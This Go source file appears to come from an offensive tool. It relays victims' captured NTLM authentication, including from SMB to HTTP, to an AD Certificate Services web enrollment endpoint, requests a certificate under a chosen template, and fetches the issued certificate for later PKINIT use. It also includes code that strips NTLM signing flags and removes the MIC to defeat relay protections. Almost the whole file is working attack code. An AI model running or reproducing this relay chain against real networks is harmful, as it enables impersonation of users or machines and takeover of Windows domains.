package relay

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// ADCSClient handles HTTP connections to ADCS with NTLM authentication
type ADCSClient struct {
	targetURL          string
	baseURL            string // Base URL (scheme + host) for certificate fetching
	templateName       string
	logger             *output.Logger
	httpClient         *http.Client
	transport          *http.Transport
	authReq            *http.Request
	authenticated      bool
	useNegotiate       bool   // Track whether to use Negotiate (SPNEGO) or raw NTLM
	crossProtocolRelay bool   // Track if this is cross-protocol relay (SMB→HTTP) requiring raw NTLM
	csrData            string // Store CSR data for the POST request
	subjectCN          string // Store subject CN for the certificate
	enrollResp         []byte // Store the enrollment response body from Type 3
}

// NewADCSClient creates a new ADCS client
func NewADCSClient(targetURL, templateName string, logger *output.Logger) *ADCSClient {
	return &ADCSClient{
		targetURL:    targetURL,
		templateName: templateName,
		logger:       logger,
	}
}

// Connect establishes connection to ADCS server and validates it's reachable
func (c *ADCSClient) Connect() error {
	c.logger.Debug(fmt.Sprintf("Connecting to ADCS: %s", c.targetURL))

	// Parse URL
	target := c.targetURL
	if !strings.Contains(target, "://") {
		target = "http://" + target
	}

	u, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("invalid ADCS URL: %w", err)
	}

	// Ensure we have a proper path
	if u.Path == "" || u.Path == "/" {
		u.Path = "/certsrv/"
	}
	c.targetURL = u.String()

	// Store base URL for certificate fetching
	c.baseURL = fmt.Sprintf("%s://%s", u.Scheme, u.Host)

	// Create HTTP client with custom transport for NTLM
	// NTLM over HTTP requires persistent connections - the same TCP connection
	// must be reused for all requests after authentication
	jar, _ := cookiejar.New(nil)
	c.transport = &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives:   false, // CRITICAL: Keep connections alive for NTLM
		DisableCompression:  true,  // Disable compression to avoid connection issues
		MaxIdleConns:        1,
		MaxIdleConnsPerHost: 1,
		MaxConnsPerHost:     1, // CRITICAL: Force single connection per host
		IdleConnTimeout:     90 * time.Second,
		ForceAttemptHTTP2:   false, // Disable HTTP/2 to ensure HTTP/1.1 keep-alive works
	}
	c.httpClient = &http.Client{
		Transport: c.transport,
		Jar:       jar,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Test connection with a simple request
	req, err := http.NewRequest("GET", c.targetURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to connect to ADCS: %w", err)
	}
	defer resp.Body.Close()

	// Check if NTLM or Negotiate auth is available
	if resp.StatusCode == 401 {
		// Get all WWW-Authenticate headers
		var authHeaders []string
		for k, v := range resp.Header {
			if strings.ToLower(k) == "www-authenticate" {
				authHeaders = append(authHeaders, v...)
			}
		}

		c.logger.Debug(fmt.Sprintf("Available auth schemes: %v", authHeaders))

		// Prefer NTLM over Negotiate for ADCS compatibility
		hasNTLM := false
		hasNegotiate := false
		for _, h := range authHeaders {
			if strings.HasPrefix(h, "NTLM") {
				hasNTLM = true
			}
			if strings.HasPrefix(h, "Negotiate") {
				hasNegotiate = true
			}
		}

		if hasNTLM {
			c.useNegotiate = false
			c.logger.Debug("ADCS endpoint supports NTLM authentication (using plain NTLM)")
			return nil
		} else if hasNegotiate {
			c.useNegotiate = true
			c.logger.Debug("ADCS endpoint supports Negotiate authentication (will use SPNEGO)")
			return nil
		}

		return fmt.Errorf("no NTLM or Negotiate authentication available (headers: %v)", authHeaders)
	}

	if resp.StatusCode == 200 {
		c.logger.Debug("ADCS endpoint accessible (no auth required or already authenticated)")
		return nil
	}

	return fmt.Errorf("ADCS endpoint returned unexpected status: %d", resp.StatusCode)
}

// ForwardNegotiate forwards NTLM Type 1 message and returns Type 2 challenge
// Type 1 should be a GET request to start authentication - CSR is sent later with Type 3
func (c *ADCSClient) ForwardNegotiate(type1 []byte) ([]byte, error) {
	c.logger.Debug("Forwarding NTLM Type 1 to ADCS")

	// For cross-protocol relay (SMB→HTTP), we must use raw NTLM without SPNEGO
	// For HTTP→HTTP relay, we can use the negotiated method (SPNEGO or raw NTLM)

	// Prepare the Authorization header
	var authHeader string
	if c.crossProtocolRelay {
		// CRITICAL: Cross-protocol relay requires raw NTLM (no SPNEGO wrapping)
		// even if the server advertised Negotiate support
		authHeader = "NTLM " + base64.StdEncoding.EncodeToString(type1)
		c.logger.Debug("Using raw NTLM Type 1 for cross-protocol relay (SMB→HTTP)")
	} else if c.useNegotiate {
		// HTTP→HTTP relay with Negotiate
		spnegoWrapped := c.wrapNTLMInSPNEGOForHTTP(type1, true)
		authHeader = "Negotiate " + base64.StdEncoding.EncodeToString(spnegoWrapped)
		c.logger.Debug(fmt.Sprintf("Using Negotiate with SPNEGO-wrapped NTLM Type 1 (%d bytes)", len(spnegoWrapped)))
	} else {
		// HTTP→HTTP relay with raw NTLM
		authHeader = "NTLM " + base64.StdEncoding.EncodeToString(type1)
		c.logger.Debug("Using raw NTLM Type 1")
	}

	// CRITICAL: Type 1 should be a GET request, NOT POST with CSR
	// The CSR is sent only with Type 3 (the authenticated request)
	// Send GET to the enrollment page to establish authentication
	c.logger.Debug(fmt.Sprintf("Sending GET to %s to start NTLM authentication", c.targetURL))
	req, err := http.NewRequest("GET", c.targetURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Authorization", authHeader)
	req.Header.Set("Connection", "keep-alive")
	c.logger.Debug(fmt.Sprintf("Sending request with Authorization: %s", authHeader[:50]+"..."))

	// Send request
	resp, err := c.httpClient.Do(req)
	if err != nil {
		c.logger.Debug(fmt.Sprintf("Error sending Type 1 request: %v", err))
		return nil, fmt.Errorf("failed to send NTLM Type 1: %w", err)
	}
	defer resp.Body.Close()

	c.logger.Debug(fmt.Sprintf("Received response: HTTP %d", resp.StatusCode))

	// Read response body for debugging
	bodyBytes, _ := io.ReadAll(resp.Body)
	if len(bodyBytes) > 0 {
		maxLen := 200
		if len(bodyBytes) < maxLen {
			maxLen = len(bodyBytes)
		}
		c.logger.Debug(fmt.Sprintf("Response body (%d bytes): %s", len(bodyBytes), string(bodyBytes[:maxLen])))
	}

	// Expect 401 with NTLM challenge
	if resp.StatusCode != 401 {
		return nil, fmt.Errorf("unexpected status code: %d (expected 401)", resp.StatusCode)
	}

	// Extract NTLM Type 2 from WWW-Authenticate header
	// Get all WWW-Authenticate headers separately (there might be multiple)
	var wwwAuthHeaders []string
	for k, v := range resp.Header {
		if strings.ToLower(k) == "www-authenticate" {
			wwwAuthHeaders = append(wwwAuthHeaders, v...)
		}
	}
	c.logger.Debug(fmt.Sprintf("Received %d WWW-Authenticate headers: %v", len(wwwAuthHeaders), wwwAuthHeaders))

	var wwwAuthHeader string
	if c.useNegotiate {
		// Find Negotiate header with challenge data
		for _, h := range wwwAuthHeaders {
			if strings.HasPrefix(h, "Negotiate ") && len(h) > 10 {
				wwwAuthHeader = h
				break
			}
		}
		if wwwAuthHeader == "" {
			return nil, fmt.Errorf("no Negotiate challenge in response (headers: %v)", wwwAuthHeaders)
		}
	} else {
		// Find NTLM header with challenge data
		for _, h := range wwwAuthHeaders {
			if strings.HasPrefix(h, "NTLM ") && len(h) > 5 {
				wwwAuthHeader = h
				break
			}
		}
		if wwwAuthHeader == "" {
			return nil, fmt.Errorf("no NTLM challenge in response (headers: %v)", wwwAuthHeaders)
		}
	}

	var type2 []byte
	if c.useNegotiate {
		// Extract from Negotiate response
		if !strings.HasPrefix(wwwAuthHeader, "Negotiate ") {
			return nil, fmt.Errorf("no Negotiate challenge in response: %s", wwwAuthHeader)
		}

		type2Base64 := strings.TrimPrefix(wwwAuthHeader, "Negotiate ")
		spnegoData, err := base64.StdEncoding.DecodeString(type2Base64)
		if err != nil {
			return nil, fmt.Errorf("failed to decode Negotiate response: %w", err)
		}

		c.logger.Debug(fmt.Sprintf("Received Negotiate response (%d bytes), unwrapping SPNEGO", len(spnegoData)))

		// Unwrap SPNEGO to get NTLM Type 2
		type2, err = c.unwrapSPNEGO(spnegoData)
		if err != nil {
			return nil, fmt.Errorf("failed to unwrap SPNEGO: %w", err)
		}
	} else {
		// Extract from raw NTLM response
		if !strings.HasPrefix(wwwAuthHeader, "NTLM ") {
			return nil, fmt.Errorf("no NTLM challenge in response: %s", wwwAuthHeader)
		}

		type2Base64 := strings.TrimPrefix(wwwAuthHeader, "NTLM ")
		type2, err = base64.StdEncoding.DecodeString(type2Base64)
		if err != nil {
			return nil, fmt.Errorf("failed to decode NTLM Type 2: %w", err)
		}
	}

	// Verify it's a valid NTLM Type 2 message
	if len(type2) < 12 {
		return nil, fmt.Errorf("NTLM Type 2 too short")
	}

	// Check signature
	if string(type2[0:8]) != "NTLMSSP\x00" {
		return nil, fmt.Errorf("invalid NTLM signature in Type 2")
	}

	// Check message type
	msgType := binary.LittleEndian.Uint32(type2[8:12])
	if msgType != 2 {
		return nil, fmt.Errorf("expected NTLM Type 2, got type %d", msgType)
	}

	c.logger.Debug(fmt.Sprintf("Received NTLM Type 2 challenge (%d bytes)", len(type2)))

	return type2, nil
}

// ForwardAuthenticate forwards NTLM Type 3 message to complete authentication
// CRITICAL: This uses POST with CSR data, so authentication happens on the actual enrollment request
func (c *ADCSClient) ForwardAuthenticate(type3 []byte) error {
	c.logger.Debug("Forwarding NTLM Type 3 to ADCS")

	if c.csrData == "" {
		return fmt.Errorf("CSR not prepared - call PrepareCSR first")
	}

	c.logger.Debug(fmt.Sprintf("Original Type 3 size: %d bytes", len(type3)))

	// For HTTP ADCS relay, do NOT modify the Type 3 message
	// For cross-protocol relay (SMB→HTTP), we must use raw NTLM without SPNEGO
	// The MIC has been zeroed but flag remains - using SPNEGO would cause auth failure
	// For HTTP→HTTP relay, we can use the negotiated method (SPNEGO or raw NTLM)

	// Prepare the Authorization header
	var authHeader string
	if c.crossProtocolRelay {
		// CRITICAL: Cross-protocol relay requires raw NTLM (no SPNEGO wrapping)
		// even if the server advertised Negotiate support
		authHeader = "NTLM " + base64.StdEncoding.EncodeToString(type3)
		c.logger.Debug("Using raw NTLM Type 3 for cross-protocol relay (SMB→HTTP)")
	} else if c.useNegotiate {
		// HTTP→HTTP relay with Negotiate
		spnegoWrapped := c.wrapNTLMInSPNEGOForHTTP(type3, false)
		authHeader = "Negotiate " + base64.StdEncoding.EncodeToString(spnegoWrapped)
		c.logger.Debug(fmt.Sprintf("Using Negotiate with SPNEGO-wrapped NTLM Type 3 (%d bytes)", len(spnegoWrapped)))
	} else {
		// HTTP→HTTP relay with raw NTLM
		authHeader = "NTLM " + base64.StdEncoding.EncodeToString(type3)
		c.logger.Debug("Using raw NTLM Type 3")
	}

	maxLen := 80
	if len(authHeader) < maxLen {
		maxLen = len(authHeader)
	}
	c.logger.Debug(fmt.Sprintf("Sending Type 3 with Authorization: %s...", authHeader[:maxLen]))

	// CRITICAL: Type 3 must be sent with GET, not POST!
	// NTLM authentication completes on a GET request, returning 200 OK.
	// Only AFTER authentication succeeds do we POST the CSR data.
	// This matches how ntlmrelayx works.
	c.logger.Debug(fmt.Sprintf("Sending GET to %s with NTLM Type 3 to complete authentication", c.targetURL))
	req, err := http.NewRequest("GET", c.targetURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Authorization", authHeader)
	req.Header.Set("Connection", "keep-alive")

	// Save this request for later use (to maintain session)
	c.authReq = req

	// Send request
	resp, err := c.httpClient.Do(req)
	if err != nil {
		c.logger.Debug(fmt.Sprintf("Error sending Type 3 request: %v", err))
		return fmt.Errorf("failed to send NTLM Type 3: %w", err)
	}
	defer resp.Body.Close()

	c.logger.Debug(fmt.Sprintf("Type 3 response status: %d", resp.StatusCode))

	// Read response body - this contains the certificate enrollment response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read Type 3 response: %w", err)
	}

	if resp.StatusCode == 401 {
		maxBodyLen := 200
		if len(body) < maxBodyLen {
			maxBodyLen = len(body)
		}
		c.logger.Error(fmt.Sprintf("NTLM Type 3 failed with 401 Unauthorized"))
		c.logger.Debug(fmt.Sprintf("Type 3 response body (%d bytes): %s", len(body), string(body[:maxBodyLen])))
		c.logger.Debug(fmt.Sprintf("Response headers: %v", resp.Header))
		return fmt.Errorf("NTLM authentication failed (401 Unauthorized)")
	}

	if resp.StatusCode != 200 && resp.StatusCode != 302 {
		return fmt.Errorf("unexpected status code after auth: %d", resp.StatusCode)
	}

	c.authenticated = true
	c.logger.Info("NTLM authentication successful (200 OK)")

	// Now that authentication is complete, POST the CSR data
	c.logger.Debug(fmt.Sprintf("Sending POST with CSR data (%d bytes) to enroll certificate", len(c.csrData)))
	postReq, err := http.NewRequest("POST", c.targetURL, strings.NewReader(c.csrData))
	if err != nil {
		return fmt.Errorf("failed to create CSR POST request: %w", err)
	}

	postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	postReq.Header.Set("Connection", "keep-alive")

	// Send the POST request (should use authenticated session)
	postResp, err := c.httpClient.Do(postReq)
	if err != nil {
		return fmt.Errorf("failed to send CSR POST: %w", err)
	}
	defer postResp.Body.Close()

	c.logger.Debug(fmt.Sprintf("CSR POST response status: %d", postResp.StatusCode))

	// Read response body - this contains the certificate
	enrollBody, err := io.ReadAll(postResp.Body)
	if err != nil {
		return fmt.Errorf("failed to read enrollment response: %w", err)
	}

	if postResp.StatusCode != 200 {
		maxBodyLen := 200
		if len(enrollBody) < maxBodyLen {
			maxBodyLen = len(enrollBody)
		}
		c.logger.Error(fmt.Sprintf("Certificate enrollment failed with status %d", postResp.StatusCode))
		c.logger.Debug(fmt.Sprintf("Response body: %s", string(enrollBody[:maxBodyLen])))
		return fmt.Errorf("certificate enrollment failed: HTTP %d", postResp.StatusCode)
	}

	// Store the enrollment response
	c.enrollResp = enrollBody
	c.logger.Info("Certificate enrollment successful")

	return nil
}

// PrepareCSR generates the CSR data and stores it for the POST request during auth
func (c *ADCSClient) PrepareCSR(privateKey *rsa.PrivateKey, subjectCN string) error {
	c.logger.Debug(fmt.Sprintf("Preparing CSR for certificate enrollment with subject: '%s'", subjectCN))
	c.subjectCN = subjectCN

	// If no CN provided, use a default that matches the authenticated user
	if subjectCN == "" {
		subjectCN = "certuser"
		c.logger.Debug("No subject provided, using default 'certuser'")
	}

	// Generate PKCS#10 CSR
	// Note: We don't include SAN in CSR - the certificate template should supply
	// the correct SAN (UPN) from Active Directory for PKINIT to work
	csrTemplate := &x509.CertificateRequest{
		Subject: pkix.Name{
			CommonName: subjectCN,
		},
		SignatureAlgorithm: x509.SHA256WithRSA,
	}

	csrDER, err := x509.CreateCertificateRequest(rand.Reader, csrTemplate, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create CSR: %w", err)
	}

	// Base64 encode CSR
	csrBase64 := base64.StdEncoding.EncodeToString(csrDER)

	// Build form data for certfnsh.asp
	formData := url.Values{
		"Mode":             {"newreq"},
		"CertRequest":      {csrBase64},
		"CertAttrib":       {"CertificateTemplate:" + c.templateName},
		"TargetStoreFlags": {"0"},
		"SaveCert":         {"yes"},
	}

	// Store the CSR data for use during auth
	c.csrData = formData.Encode()
	c.logger.Debug(fmt.Sprintf("CSR prepared (%d bytes)", len(c.csrData)))

	return nil
}

// RequestCertificate retrieves the certificate after successful authentication
// Note: Authentication was done with POST request that included the CSR
// The enrollment response is already stored from the Type 3 exchange
func (c *ADCSClient) RequestCertificate(privateKey *rsa.PrivateKey, subjectCN string) (*x509.Certificate, error) {
	if !c.authenticated {
		return nil, fmt.Errorf("not authenticated")
	}

	c.logger.Debug(fmt.Sprintf("Requesting certificate with template: %s", c.templateName))

	// Use the enrollment response that was received during Type 3 authentication
	bodyStr := string(c.enrollResp)

	c.logger.Debug(fmt.Sprintf("Certificate enrollment response status: authenticated"))
	if len(bodyStr) > 500 {
		c.logger.Debug(fmt.Sprintf("Response body preview: %s...", bodyStr[:500]))
	} else {
		c.logger.Debug(fmt.Sprintf("Response body: %s", bodyStr))
	}

	// Check for denial first
	if strings.Contains(bodyStr, "Certificate Request Denied") || strings.Contains(bodyStr, "was denied") {
		// Extract the denial reason
		dispositionRegex := regexp.MustCompile(`disposition message is "([^"]+)"`)
		matches := dispositionRegex.FindStringSubmatch(bodyStr)
		if len(matches) >= 2 {
			return nil, fmt.Errorf("certificate request denied: %s", matches[1])
		}
		return nil, fmt.Errorf("certificate request denied by ADCS")
	}

	// Check for other errors in response
	if strings.Contains(bodyStr, "Access is denied") {
		return nil, fmt.Errorf("access denied - user may not have enrollment rights for template %s", c.templateName)
	}

	if strings.Contains(bodyStr, "The requested certificate template is not supported") {
		return nil, fmt.Errorf("certificate template '%s' not found or not supported", c.templateName)
	}

	if strings.Contains(bodyStr, "Denied by Policy Module") {
		return nil, fmt.Errorf("certificate request denied by policy - template may require manager approval")
	}

	// Extract request ID from response
	// Look for pattern like: certnew.cer?ReqID=123
	reqIDRegex := regexp.MustCompile(`ReqID=(\d+)`)
	matches := reqIDRegex.FindStringSubmatch(bodyStr)
	if len(matches) < 2 {
		// Try alternative pattern
		reqIDRegex2 := regexp.MustCompile(`name="ReqID"\s+value="(\d+)"`)
		matches = reqIDRegex2.FindStringSubmatch(bodyStr)
		if len(matches) < 2 {
			c.logger.Debug(fmt.Sprintf("Response body: %s", bodyStr))
			return nil, fmt.Errorf("could not find request ID in response")
		}
	}

	reqID := matches[1]
	c.logger.Debug(fmt.Sprintf("Certificate request ID: %s", reqID))

	// Fetch the issued certificate using the authenticated connection
	// Use base URL + /certsrv/certnew.cer to fetch the certificate
	certURL := fmt.Sprintf("%s/certsrv/certnew.cer?ReqID=%s&Enc=b64", c.baseURL, reqID)
	c.logger.Debug(fmt.Sprintf("Fetching certificate from: %s", certURL))

	certReq, err := http.NewRequest("GET", certURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create cert fetch request: %w", err)
	}

	// Use the authenticated HTTP client to fetch the certificate
	certResp, err := c.httpClient.Do(certReq)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch certificate: %w", err)
	}
	defer certResp.Body.Close()

	certBody, err := io.ReadAll(certResp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read certificate response: %w", err)
	}

	// Check if we got a pending response
	if strings.Contains(string(certBody), "pending") || strings.Contains(string(certBody), "Pending") {
		return nil, fmt.Errorf("certificate request is pending manager approval (Request ID: %s)", reqID)
	}

	// Parse the certificate
	// The response might be base64 encoded DER or PEM
	certData := strings.TrimSpace(string(certBody))

	// Try to decode as base64
	var certDER []byte
	if strings.Contains(certData, "-----BEGIN CERTIFICATE-----") {
		// PEM format - extract the base64 part
		pemStart := strings.Index(certData, "-----BEGIN CERTIFICATE-----")
		pemEnd := strings.Index(certData, "-----END CERTIFICATE-----")
		if pemStart >= 0 && pemEnd > pemStart {
			base64Data := certData[pemStart+27 : pemEnd]
			base64Data = strings.ReplaceAll(base64Data, "\n", "")
			base64Data = strings.ReplaceAll(base64Data, "\r", "")
			certDER, err = base64.StdEncoding.DecodeString(base64Data)
			if err != nil {
				return nil, fmt.Errorf("failed to decode PEM certificate: %w", err)
			}
		}
	} else {
		// Assume raw base64 DER
		certDER, err = base64.StdEncoding.DecodeString(certData)
		if err != nil {
			return nil, fmt.Errorf("failed to decode certificate: %w", err)
		}
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("failed to parse certificate: %w", err)
	}

	c.logger.Success(fmt.Sprintf("Successfully obtained certificate (Subject: %s)", cert.Subject.CommonName))

	return cert, nil
}

// Close closes the ADCS connection
func (c *ADCSClient) Close() error {
	// Nothing to explicitly close for HTTP client
	return nil
}

// wrapNTLMInSPNEGOForHTTP wraps NTLM message in SPNEGO for HTTP Negotiate auth
func (c *ADCSClient) wrapNTLMInSPNEGOForHTTP(ntlmMsg []byte, isType1 bool) []byte {
	if isType1 {
		// NegTokenInit for Type 1 - same structure as LDAP
		// Build the complete SPNEGO wrapper with proper length calculation
		mechTokenLen := len(ntlmMsg) + 2       // OCTET STRING tag + length + data
		innerSeqLen := 0x0e + mechTokenLen + 2 // mechTypes + mechToken
		outerContextLen := innerSeqLen + 2     // SEQUENCE wrapper
		totalLen := 0x08 + outerContextLen + 2 // OID + context

		result := make([]byte, 0, totalLen+2)
		result = append(result, 0x60, byte(totalLen))                                                   // Application 0
		result = append(result, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02)                         // SPNEGO OID (1.3.6.1.5.5.2)
		result = append(result, 0xa0, byte(outerContextLen))                                            // Context 0
		result = append(result, 0x30, byte(innerSeqLen))                                                // SEQUENCE
		result = append(result, 0xa0, 0x0e)                                                             // Context 0 (mechTypes)
		result = append(result, 0x30, 0x0c)                                                             // SEQUENCE
		result = append(result, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a) // NTLMSSP OID (1.3.6.1.4.1.311.2.2.10)
		result = append(result, 0xa2, byte(mechTokenLen))                                               // Context 2 (mechToken)
		result = append(result, 0x04, byte(len(ntlmMsg)))                                               // OCTET STRING
		result = append(result, ntlmMsg...)                                                             // Actual NTLM Type 1 message
		return result
	}

	// NegTokenResp for Type 3 - same structure as LDAP
	result := make([]byte, 0)
	result = append(result, 0xa1)                   // NegTokenResp tag
	result = append(result, byte(len(ntlmMsg)+4+2)) // length
	result = append(result, 0x30)                   // SEQUENCE
	result = append(result, byte(len(ntlmMsg)+4))   // length
	result = append(result, 0xa2)                   // responseToken tag
	result = append(result, byte(len(ntlmMsg)+2))   // length
	result = append(result, 0x04)                   // OCTET STRING
	result = append(result, byte(len(ntlmMsg)))     // length
	result = append(result, ntlmMsg...)
	return result
}

// unwrapSPNEGO extracts NTLM message from SPNEGO
func (c *ADCSClient) unwrapSPNEGO(spnego []byte) ([]byte, error) {
	// Parse SPNEGO to extract NTLM Type 2
	// This is a simplified parser - looks for NTLMSSP signature

	// Look for NTLMSSP signature (0x4e544c4d53535000)
	ntlmSig := []byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00}

	for i := 0; i < len(spnego)-8; i++ {
		if bytes.Equal(spnego[i:i+8], ntlmSig) {
			// Found NTLMSSP signature, return from here to end
			c.logger.Debug(fmt.Sprintf("Found NTLMSSP signature at offset %d in SPNEGO", i))
			return spnego[i:], nil
		}
	}

	return nil, fmt.Errorf("NTLMSSP signature not found in SPNEGO")
}

// removeSigningFlags removes signing-related flags from NTLM Type 1
func (c *ADCSClient) removeSigningFlags(type1 []byte) []byte {
	if len(type1) < 20 {
		return type1
	}

	modified := make([]byte, len(type1))
	copy(modified, type1)

	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
	)

	flags := binary.LittleEndian.Uint32(modified[12:16])

	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
		c.logger.Debug("Removed NTLMSSP_NEGOTIATE_SIGN flag from Type 1")
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
		c.logger.Debug("Removed NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag from Type 1")
	}

	binary.LittleEndian.PutUint32(modified[12:16], flags)
	return modified
}

// removeMICFromType3 removes MIC and other problematic fields from NTLM Type 3
func (c *ADCSClient) removeMICFromType3(type3 []byte) []byte {
	if len(type3) < 88 {
		return type3
	}

	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
		NTLMSSP_NEGOTIATE_KEY_EXCH    = 0x40000000
		NTLMSSP_NEGOTIATE_VERSION     = 0x02000000
	)

	flags := binary.LittleEndian.Uint32(type3[60:64])

	originalFlags := flags
	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_KEY_EXCH != 0 {
		flags ^= NTLMSSP_NEGOTIATE_KEY_EXCH
	}

	hasVersion := (originalFlags & NTLMSSP_NEGOTIATE_VERSION) != 0

	if hasVersion {
		flags ^= NTLMSSP_NEGOTIATE_VERSION

		modified := make([]byte, len(type3))
		copy(modified, type3)

		binary.LittleEndian.PutUint32(modified[60:64], flags)

		sessKeyLen := binary.LittleEndian.Uint16(modified[52:54])
		sessKeyOffset := binary.LittleEndian.Uint32(modified[56:60])
		hasSessionKey := (originalFlags&NTLMSSP_NEGOTIATE_KEY_EXCH) != 0 && sessKeyLen > 0

		if hasSessionKey {
			binary.LittleEndian.PutUint16(modified[52:54], 0)
			binary.LittleEndian.PutUint16(modified[54:56], 0)
		}

		bytesToSkip := 24
		if hasSessionKey {
			bytesToSkip += int(sessKeyLen)
		}

		offsetPositions := []int{16, 24, 32, 40, 48, 56}

		for _, pos := range offsetPositions {
			if pos+4 <= len(modified) {
				offset := binary.LittleEndian.Uint32(modified[pos : pos+4])
				if offset >= 88 {
					offset -= 24
					if hasSessionKey && offset >= sessKeyOffset {
						offset -= uint32(sessKeyLen)
					}
					binary.LittleEndian.PutUint32(modified[pos:pos+4], offset)
				}
			}
		}

		final := make([]byte, 0, len(type3)-bytesToSkip)
		final = append(final, modified[0:64]...)

		if hasSessionKey && sessKeyOffset > 88 {
			final = append(final, modified[88:sessKeyOffset]...)
			final = append(final, modified[sessKeyOffset+uint32(sessKeyLen):]...)
		} else {
			final = append(final, modified[88:]...)
		}

		final = c.clearMICFlagInAVPairs(final)

		c.logger.Debug(fmt.Sprintf("Removed MIC, VERSION, and signing flags from Type 3 (removed %d bytes)", bytesToSkip))
		return final
	}

	modified := make([]byte, len(type3))
	copy(modified, type3)
	binary.LittleEndian.PutUint32(modified[60:64], flags)

	c.logger.Debug("Removed signing flags from Type 3 (no VERSION/MIC to remove)")
	return modified
}

// clearMICFlagInAVPairs clears the MIC Present flag in the AV_PAIRS
func (c *ADCSClient) clearMICFlagInAVPairs(type3 []byte) []byte {
	if len(type3) < 28 {
		return type3
	}

	ntlmRespLen := binary.LittleEndian.Uint16(type3[20:22])
	ntlmRespOffset := binary.LittleEndian.Uint32(type3[24:28])

	if ntlmRespOffset+uint32(ntlmRespLen) > uint32(len(type3)) {
		c.logger.Debug("Invalid NTLM response offset/length, skipping AV_PAIRS modification")
		return type3
	}

	if ntlmRespLen < 44 {
		c.logger.Debug("NTLMv2 response too short for AV_PAIRS")
		return type3
	}

	modified := make([]byte, len(type3))
	copy(modified, type3)

	avPairsStart := ntlmRespOffset + 44
	offset := avPairsStart

	for offset < ntlmRespOffset+uint32(ntlmRespLen)-4 {
		avID := binary.LittleEndian.Uint16(modified[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(modified[offset+2 : offset+4])

		if avID == 0 {
			break
		}

		if avID == 6 && avLen == 4 {
			flags := binary.LittleEndian.Uint32(modified[offset+4 : offset+8])
			const MIC_PRESENT = 0x00000002

			if flags&MIC_PRESENT != 0 {
				flags &^= MIC_PRESENT
				binary.LittleEndian.PutUint32(modified[offset+4:offset+8], flags)
				c.logger.Debug("Cleared MIC Present flag in AV_PAIRS")
			}
			break
		}

		offset += 4 + uint32(avLen)
	}

	return modified
}
